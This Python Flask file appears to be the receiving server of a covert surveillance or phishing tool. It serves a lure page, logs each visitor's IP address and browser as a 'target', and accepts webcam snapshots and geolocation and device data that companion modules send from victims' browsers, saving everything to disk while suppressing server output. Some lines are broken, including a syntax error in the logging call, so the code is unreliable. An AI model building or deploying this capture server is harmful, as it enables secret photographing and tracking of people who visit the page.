from random import randint, choice
from datetime import datetime
from flask import Flask, render_template, request
from base64 import b64decode as b64
import logging
import click
import os

YELLOW = '\033[33m'
GREEN = '\033[32;1m'
WHITE = '\033[m'

# Main Flask Object

class server:
	def __init__(self,port,param,page='final.html'):
		self.port = port
		self.param = param # For checking if multiple modules were passed or not
		self.page = page
		self.conn_num = 0
		self.main()

	def write_target_logs(self, data):
		mode = 'w'
		if os.path.isfile('iplog.txt'):
			mode = 'a'
		with open('iplog.txt',mode) as f:
			f.write(data+'\n')

	def GenName(self): # For generating random word
		a = ''
		for i in range(randint(5,10)):
			a+=choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
		return a

	def main(self):

		app = Flask(__name__)

		# To prevent flask from printing data
		def secho(text,file=None,nl=None,err=None,color=None,**styles):
			pass
		def echo(text,file=None,nl=None,err=None,color=None,**styles):
			pass
		click.echo = echo
		click.secho = secho
		log = logging.getLogger('werkzeug')
		log.setLevel(logging.ERROR)
		
		'''
			Here you can create routes for your modules for saving data.
		'''

		@app.route('/')
		def home():
			UA = request.user_agent
			IP = request.remote_addr
			self.write_target_logs(str(self.conn_num)+'. 'str(IP)+': '+str(UA)+'\n\n')
			print(f'\n{self.conn_num+1} [+] {GREEN}INCOMING REQUEST FROM {IP}:- {WHITE}{YELLOW} {UA}{WHITE}\n')
			self.conn_num+=1
			return render_template(self.page)

		@app.route('/savepic',methods=['POST','GET']) # This is where the webcam_snap module sends its data
		def savepic():
			if request.method == 'POST':
				name = '[PIC]_'+datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+'_'+self.GenName()+'.jpeg'
				print('pic coming')
				with open(name,'wb') as f:
					f.write(b64(request.get_json().replace('data:image/jpeg;base64,','')))
				print('pic saved')
				return '200','OK'
		@app.route('/saveinfo',methods=['POST','GET']) # This is where the geolocation_device_info module sends its data
		def saveinfo():
			if request.method == 'POST':
				name = '[DEVICE_INFO_GEO]' + datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+'_'+self.GenName()+'.txt'
				print('incoming shit')
				with open(name,'w') as f:
					f.write(request.get_json())	
				print('shit saved')
				return '200','OK'
		@app.route('/saverror',methods=['POST','GET']) # All modules should send error logs here
		def saverror():
			if request.method == 'POST':
				with open('error_log.txt','a') as f:
					f.write(datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+': '+str(request.get_json()))
		app.run(host="0.0.0.0",debug=False)
